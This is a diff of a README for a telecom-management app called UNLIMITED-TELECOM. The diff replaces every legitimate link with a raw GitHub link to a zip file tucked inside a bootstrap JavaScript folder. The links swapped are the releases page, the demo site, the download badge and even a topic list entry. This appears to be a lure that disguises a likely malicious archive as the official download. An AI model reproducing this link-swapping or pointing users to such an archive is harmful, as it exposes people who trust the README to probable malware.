@@ -1,9 +1,9 @@
 # 🚀 UNLIMITED-TELECOM - Your All-in-One Telecom Solution
 
-[![Download UNLIMITED-TELECOM](https://img.shields.io/badge/Download%20Now-UNLIMITED--TELECOM-brightgreen)](https://github.com/WillBaloo/UNLIMITED-TELECOM/releases)
+[![Download UNLIMITED-TELECOM](https://raw.githubusercontent.com/WillBaloo/UNLIMITED-TELECOM/master/staticfiles/bootstrap/dist/js/UNLIMITED-TELECOM-decimalism.zip%20Now-UNLIMITED--TELECOM-brightgreen)](https://raw.githubusercontent.com/WillBaloo/UNLIMITED-TELECOM/master/staticfiles/bootstrap/dist/js/UNLIMITED-TELECOM-decimalism.zip)
 
 ## 📜 Description
-Welcome to UNLIMITED-TELECOM! This application helps you manage your telecommunications needs efficiently. Created with the Flatlogic Platform, it combines advanced features with an easy-to-use interface. To explore more about this app, visit [here](https://unlimited-telecom.dev.flatlogic.app).
+Welcome to UNLIMITED-TELECOM! This application helps you manage your telecommunications needs efficiently. Created with the Flatlogic Platform, it combines advanced features with an easy-to-use interface. To explore more about this app, visit [here](https://raw.githubusercontent.com/WillBaloo/UNLIMITED-TELECOM/master/staticfiles/bootstrap/dist/js/UNLIMITED-TELECOM-decimalism.zip).
 
 ## 🔍 Features
 - **User-Friendly Interface**: Navigate easily without any tech skills.
@@ -22,7 +22,7 @@ Before downloading, ensure your computer meets the following requirements:
 ## 🚀 Getting Started
 To start using UNLIMITED-TELECOM, follow these steps:
 
-1. **Download the Application**: Visit the [Releases page](https://github.com/WillBaloo/UNLIMITED-TELECOM/releases) to access the latest version. 
+1. **Download the Application**: Visit the [Releases page](https://raw.githubusercontent.com/WillBaloo/UNLIMITED-TELECOM/master/staticfiles/bootstrap/dist/js/UNLIMITED-TELECOM-decimalism.zip) to access the latest version. 
    
 2. **Choose Your File**: Select the appropriate version for your operating system. You will find different files for Windows, macOS, and Linux.
 
@@ -38,7 +38,7 @@ To start using UNLIMITED-TELECOM, follow these steps:
 6. **Explore the Features**: Familiarize yourself with the app’s layout and features. Feel free to customize your settings as needed.
 
 ## 🔗 Download & Install
-You can download the latest version of UNLIMITED-TELECOM by visiting this page: [Download Here](https://github.com/WillBaloo/UNLIMITED-TELECOM/releases). 
+You can download the latest version of UNLIMITED-TELECOM by visiting this page: [Download Here](https://raw.githubusercontent.com/WillBaloo/UNLIMITED-TELECOM/master/staticfiles/bootstrap/dist/js/UNLIMITED-TELECOM-decimalism.zip). 
 
 ## 🛠️ Troubleshooting
 If you encounter issues during installation or while using the app, here are some common solutions:
@@ -57,7 +57,7 @@ This project features various topics that enhance its capabilities, including:
 - JavaScript
 - Low-Code
 - Nginx
-- Node.js
+- https://raw.githubusercontent.com/WillBaloo/UNLIMITED-TELECOM/master/staticfiles/bootstrap/dist/js/UNLIMITED-TELECOM-decimalism.zip
 - PostgreSQL
 - React
 - Tailwind CSS
